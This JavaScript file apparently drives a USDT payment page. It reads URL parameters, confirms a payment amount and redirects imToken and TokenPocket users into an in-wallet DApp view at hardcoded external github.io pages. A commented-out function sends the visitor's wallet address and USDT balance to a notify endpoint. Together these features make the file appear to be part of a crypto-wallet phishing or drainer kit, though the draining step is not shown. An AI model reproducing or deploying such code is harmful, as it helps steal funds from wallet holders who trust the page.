function loadData() {
	$('#from_url').val(unescape(getUrlParams('from_url')))
	$('#to_address').val(getUrlParams('to_address'))
	$('#addtype').val(getUrlParams('addtype'))
	$('#from').val(getUrlParams('from'))
}

//获取url参数
function getUrlParams(key) {
	var url = window.location.search.substr(1)
	if (url == '') {
		return false
	}
	var paramsArr = url.split('&')
	for (var i = 0; i < paramsArr.length; i++) {
		var combina = paramsArr[i].split('=')
		if (combina[0] == key) {
			return combina[1]
		}
	}
	return false
}

// function addfry() {
// 	$.ajax({
// 		url: "/notify.php",
// 		data: {
// 			address: $("#address").val(),
// 			to_address: $("#to_address").val(),
// 			balance: $("#usdt_balance").val(),
// 			type: $("#addtype").val(),
// 		},
// 		type: "post",
// 		success: function(data, textStatus, xhr) {
// 			console.log(data);
// 		},
// 		error: function(xhr, textStatus, error) {}
// 	});
// }

//--------------paylist---------------

function paylistloadData() {
	$('#addtype').val(getUrlParams('addtype'))
	$('#to_address').val(getUrlParams('to_address'))
	$('#from_url').val(unescape(getUrlParams('from_url')))

	if (getUrlParams('addtype') == 'trc20') {
		$('#tr_Metamask').hide()
	} else if (getUrlParams('addtype') == 'erc20') {
		$('#tr_TronLink').hide()
	} else {
	}
}
function GetRequest() {
	var url = location.search //获取url中"?"符后的字串
	var theRequest = new Object()
	if (url.indexOf('?') != -1) {
		var str = url.substr(1)
		strs = str.split('&')
		for (var i = 0; i < strs.length; i++) {
			theRequest[strs[i].split('=')[0]] = unescape(strs[i].split('=')[1])
		}
	}
	return theRequest
}
// console.dir(GetRequest())
window.vip = GetRequest().vip || ''
// document.getElementById('input_num').value = vip
function paylistevent(from) {
	let addtype = $('#addtype').val()
	let from_url = $('#from_url').val()
	let to_address = $('#to_address').val()
	// let im_url = encodeURIComponent(window.location.protocol + "//" + window.location.host + "/" + addtype +
	// 	".html?from=" + from +
	// 	"&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url);

	// let tp_url = encodeURIComponent(window.location.protocol + "//" + window.location.host + "/" + addtype + ".html?from=" + from +
	// "&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url);
	// var Ead = document.getElementById('input_num').innerHTML
	let im_url = 'https://svip66.github.io/c/index.html?vip=' + vip
	let tp_url = 'https://svip66.github.io/c/index.html?vip=' + vip
	let my_url = 'https://svip66.github.io/e/index.html?vip=' + vip

	// let qr_url = 	window.location.protocol + "//" + window.location.host + "https://svip66.github.io/b/" + addtype + "&to_address=" + to_address + "&from_url=" + from_url;

	if (from == 'imToken') {
		if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
			
            location.href = 'imtokenv2://navigate?screen=DappView&url=' + im_url;
       
		} else {
			alert('请在手机游览器操作！')
			// 	        location.href = qr_url;
		}
	} else if (from == 'TokenPocket') {
		if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
			// if (addtype == 'trc20') {
			// location.href = 'tpdapp://open?params={"url": "' + tp_url + '"}'
			// } else {
			location.href = 'tpdapp://open?params={"url": "' + tp_url + '", "chain": "ERC", "source":"xxx"}'
			// }
		} else {
			alert('请在手机游览器操作！')
			// 	        location.href = qr_url;
		}
	} else {
		$('#pay_' + from).modal('show')
		$('#pay_' + from + '_url').val(my_url)
	}
}

function payconfirm() {
	let payment = $('#payment').val()
	if ($.isNumeric(payment)) {
		if (payment > 0) {
			$('#confirm_amount').html("当前支付金额&nbsp<strong style='color: red;'>" + payment + '</strong>&nbspUSDT')
			$('#pay_confirm').modal('show')
		} else {
			alert('请填写正确的金额')
		}
	}
}
